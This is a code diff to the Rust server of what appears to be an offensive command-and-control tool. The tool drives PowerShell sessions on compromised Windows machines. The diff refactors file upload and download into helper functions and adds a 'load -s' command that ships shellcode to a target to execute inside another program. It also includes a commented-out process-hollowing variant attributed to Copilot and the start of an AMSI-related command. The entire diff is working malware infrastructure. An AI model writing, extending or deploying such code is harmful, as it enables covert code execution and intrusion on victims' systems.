@@ -10,6 +10,7 @@ use regex::Regex;
 use std::net::{Ipv4Addr, SocketAddrV4, TcpListener};
 
 use crate::autopwn;
+use crate::utils::tools::{read_and_send_file, receive_and_write_bytes};
 
 static PATH_REGEX: &str = r#"PS (?<ParentPath>(?:[a-zA-Z]\:|\\\\[\w\s\.\-]+\\[^\/\\<>:"|?\n\r]+)\\(?:[^\/\\<>:"|?\n\r]+\\)*)(?<BaseName>[^\/\\<>:"|?\n\r]*?)> "#;
 
@@ -131,7 +132,6 @@ pub fn server(i: &str, port: u16, cert_path: &str, cert_pass: &str) -> Result<()
                                 } else {
                                     match File::create(path[2].trim_end_matches('\0').trim_end()) {
                                         Ok(mut file) => {
-                                            let mut buff = [0; 4096];
                                             match stream.write(cmd.as_bytes()) {
                                                 Ok(_) => (),
                                                 Err(r) => {
@@ -143,54 +143,33 @@ pub fn server(i: &str, port: u16, cert_path: &str, cert_pass: &str) -> Result<()
                                                     continue;
                                                 }
                                             }
+                                            let mut buff = [0; 4096];
+                                            let mut file_vec: Vec<u8> = Vec::new();
                                             match stream.read(&mut buff) {
-                                                Ok(_) => loop {
-                                                    if String::from_utf8_lossy(&buff)
-                                                        .starts_with("EndOfTheFile")
-                                                    {
-                                                        // Drop all the ending null bytes added by the buffer
-                                                        let file_len_string =
-                                                            String::from_utf8_lossy(&buff)
-                                                                .split_once(':')
-                                                                .map(|x| x.1)
-                                                                .unwrap_or("0")
-                                                                .trim_end_matches('\0')
-                                                                .to_owned();
-                                                        let file_len_u64 =
-                                                            file_len_string.parse::<u64>();
-                                                        match file.set_len(file_len_u64.unwrap()) {
-                                                            Ok(_) => (),
-                                                            Err(r) => {
-                                                                log::error!("Error dropping the null bytes at the end of the file : {}", r);
-                                                                continue;
-                                                            }
-                                                        }
-                                                        break;
-                                                    } else {
-                                                        match file.write(&buff) {
-                                                            Ok(_) => {
-                                                                buff = [0; 4096];
-                                                                stream
-                                                                    .read(&mut buff)
-                                                                    .unwrap();
-                                                            }
-                                                            Err(r) => {
-                                                                log::error!(
-                                                                    "Error writing the file : {}",
-                                                                    r
-                                                                );
-                                                                stream.flush().unwrap();
-                                                                break;
-                                                            }
+                                                Ok(_) => {
+                                                    match receive_and_write_bytes(
+                                                        &mut stream,
+                                                        &mut file_vec,
+                                                        &mut buff,
+                                                    ) {
+                                                        Ok(_) => (),
+                                                        Err(r) => {
+                                                            log::error!(
+                                                                "Error receiving data : {}",
+                                                                r
+                                                            );
+                                                            stream.flush().unwrap();
+                                                            continue;
                                                         }
                                                     }
-                                                },
+                                                }
                                                 Err(r) => {
                                                     log::error!("Error during download : {}", r);
                                                     stream.flush().unwrap();
                                                     continue;
                                                 }
                                             }
+                                            file.write(&file_vec).expect("Error writing the file");
                                         }
                                         Err(r) => {
                                             log::error!("Error during file creation : {}", r);
@@ -205,7 +184,7 @@ pub fn server(i: &str, port: u16, cert_path: &str, cert_pass: &str) -> Result<()
                                     log::warn!("Invalid argument number. Usage is : upload C:\\local\\file\\to\\upload C:\\remote\\path\\to\\write\0");
                                 } else {
                                     match File::open(path[1]) {
-                                        Ok(mut file) => {
+                                        Ok(file) => {
                                             let mut buff = [0; 4096];
                                             match stream.write(cmd.as_bytes()) {
                                                 Ok(_) => {
@@ -233,46 +212,12 @@ pub fn server(i: &str, port: u16, cert_path: &str, cert_pass: &str) -> Result<()
                                                     continue;
                                                 }
                                             }
-                                            buff = [0; 4096];
-                                            loop {
-                                                match file.read(&mut buff) {
-                                                    Ok(bytes_read) => {
-                                                        if bytes_read == 0 {
-                                                            let end_of_file = "EndOfTheFile:"
-                                                                .to_owned()
-                                                                + &file
-                                                                    .metadata()
-                                                                    .unwrap()
-                                                                    .len()
-                                                                    .to_string();
-                                                            stream
-                                                                .write_all(end_of_file.as_bytes())
-                                                                .expect(
-                                                                    "Error writing EndOfTheFile",
-                                                                );
-                                                            break;
-                                                        }
-                                                        match stream.write_all(&buff[..bytes_read])
-                                                        {
-                                                            Ok(()) => (),
-                                                            Err(r) => {
-                                                                log::error!(
-                                                                    "Error during upload : {}",
-                                                                    r
-                                                                );
-                                                                stream.flush().unwrap();
-                                                                continue;
-                                                            }
-                                                        }
-                                                    }
-                                                    Err(r) => {
-                                                        log::error!(
-                                                            "Error reading the file : {}",
-                                                            r
-                                                        );
-                                                        stream.flush().unwrap();
-                                                        continue;
-                                                    }
+                                            match read_and_send_file(file, &mut stream) {
+                                                Ok(_) => (),
+                                                Err(r) => {
+                                                    log::error!("Error during upload : {}", r);
+                                                    stream.flush().unwrap();
+                                                    continue;
                                                 }
                                             }
                                         }
@@ -285,6 +230,90 @@ pub fn server(i: &str, port: u16, cert_path: &str, cert_pass: &str) -> Result<()
                                 }
                                 continue;
                             }
+
+                            // Check for load command
+                            if cmd.as_str().starts_with("load -s")
+                                || cmd.as_str().starts_with("syscalls -s")
+                            {
+                                let path: Vec<&str> = cmd.split(' ').collect();
+                                if path.len() != 4 {
+                                    log::warn!("Invalid argument number. Usage is : load -s C:\\path\\to\\shellcode.bin C:\\path\\to\\PE_to_execute\0");
+                                } else {
+                                    match File::open(path[2]) {
+                                        Ok(file) => {
+                                            match stream.write(cmd.as_bytes()) {
+                                                Ok(_) => (),
+                                                Err(r) => {
+                                                    log::error!(
+                                                        "Error sending the load command : {}",
+                                                        r
+                                                    );
+                                                    stream.flush().unwrap();
+                                                    continue;
+                                                }
+                                            }
+                                            match read_and_send_file(file, &mut stream) {
+                                                Ok(_) => (),
+                                                Err(r) => {
+                                                    log::error!("Error during loading : {}", r);
+                                                    stream.flush().unwrap();
+                                                    continue;
+                                                }
+                                            }
+                                        }
+                                        Err(r) => {
+                                            log::error!("File cannot be opened : {}", r);
+                                            stream.flush().unwrap();
+                                            continue;
+                                        }
+                                    }
+                                }
+                                stream
+                                    .read(&mut buff)
+                                    .expect("Error reading the result of the load command");
+                                continue;
+                            }
+
+                            // Snippet for load -h command with PE loading from the server by Copilot
+                            // For future use
+                            /*else if cmd.as_str().starts_with("load -h") {
+                                let path: Vec<&str> = cmd.split(' ').collect();
+                                if path.len() != 4 {
+                                    log::warn!("Invalid argument number. Usage is : load -h C:\\path\\to\\PE_to_load C:\\path\\to\\PE_to_hollow\0");
+                                } else {
+                                    match File::open(path[2]) {
+                                        Ok(mut file) => {
+                                            let mut buff = [0; 4096];
+                                            match stream.write(cmd.as_bytes()) {
+                                                Ok(_) => (),
+                                                Err(r) => {
+                                                    log::error!(
+                                                        "Error sending the load command : {}",
+                                                        r
+                                                    );
+                                                    stream.flush().unwrap();
+                                                    continue;
+                                                }
+                                            }
+                                            match read_and_send_file(file, &mut stream) {
+                                                Ok(_) => (),
+                                                Err(r) => {
+                                                    log::error!("Error during load : {}", r);
+                                                    stream.flush().unwrap();
+                                                    continue;
+                                                }
+                                            }
+                                        }
+                                        Err(r) => {
+                                            log::error!("File cannot be opened : {}", r);
+                                            stream.flush().unwrap();
+                                            continue;
+                                        }
+                                    }
+                                }
+                                continue;
+                            } else if cmd.as_str().starts_with("load") {
+                            }*/
 
                             // Check for amsi command
                             if cmd.as_str().starts_with("powpow") {
